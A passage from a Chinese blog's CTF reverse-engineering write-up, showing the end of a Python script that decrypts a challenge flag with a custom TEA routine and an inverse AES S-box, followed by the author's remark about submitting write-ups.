dwords_to_bytes_little_endian(tenc)</span><br><span class="line"><span class="built_in">print</span>([<span class="string">f&#x27;<span class="subst">&#123;byte:#02x&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> enc1])</span><br><span class="line"></span><br><span class="line">encflag = [<span class="number">0x4b</span>,<span class="number">0x18</span>,<span class="number">0x1f</span>,<span class="number">0xd6</span>,<span class="number">0xf8</span>,<span class="number">0xb8</span>,<span class="number">0x52</span>,<span class="number">0xa9</span>,<span class="number">0xe2</span>,<span class="number">0x3a</span>,<span class="number">0x4a</span>,<span class="number">0x77</span>,<span class="number">0x76</span>,<span class="number">0xe5</span>,<span class="number">0xf6</span>,<span class="number">0x90</span>,</span><br><span class="line">           <span class="number">0x5b</span>,<span class="number">0x71</span>,<span class="number">0x34</span>,<span class="number">0x1a</span>,<span class="number">0xf8</span>,<span class="number">0xf1</span>,<span class="number">0x94</span>,<span class="number">0xa5</span>,<span class="number">0xdb</span>,<span class="number">0x07</span>,<span class="number">0xd2</span>,<span class="number">0x90</span>,<span class="number">0x2d</span>,<span class="number">0x26</span>,<span class="number">0x55</span>,<span class="number">0x40</span>,</span><br><span class="line">           <span class="number">0x13</span>,<span class="number">0x22</span>,<span class="number">0xe1</span>,<span class="number">0xc9</span>,<span class="number">0xa1</span>,<span class="number">0xa9</span>,<span class="number">0x0e</span>,<span class="number">0x0d</span>,<span class="number">0x86</span>,<span class="number">0x76</span>,<span class="number">0x80</span>,<span class="number">0x9c</span>,<span class="number">0x08</span>,<span class="number">0x48</span>,<span class="number">0x47</span>,<span class="number">0x62</span>]</span><br><span class="line">tdec = DeMyTEA(encflag,key)</span><br><span class="line">dec1 = dwords_to_bytes_little_endian(tdec)</span><br><span class="line">sdec = AES_sbox_untransform(dec1, AES_sbox)</span><br></pre></td></tr></table></figure>

<p>注：第一周的时候看到很多全栈大佬，以为自己拿不到奖了，且第二周题目明显变难，于是只交了第一周的wp，第二周没交，结果没想到ban了一大堆人，只凭第一周的得分也上榜了，看来以后还是得积极交wp（）</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2025/03/16/nssctf_round27/"
      title="NSSCTF Round#27 Basic Reverse个人赛 WriteUp"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        NSSCTF Round#27 Basic Reverse个人赛 WriteUp
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/2024/12/09/hectf_24/"
      title="HECTF 2024 WriteUp"
     >

    <p class="title-text">
      
        HECTF 2024 WriteUp
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>

 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2025 Astral Prisma<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn hide" onclick="topFunction()">
        <i class="fa-solid fa-angle-up"></i>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.classList.remove('hide')
        } else {
            btn.classList.add('hide')
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/js/light-dark-switch.js"></script>
</body>
</html>
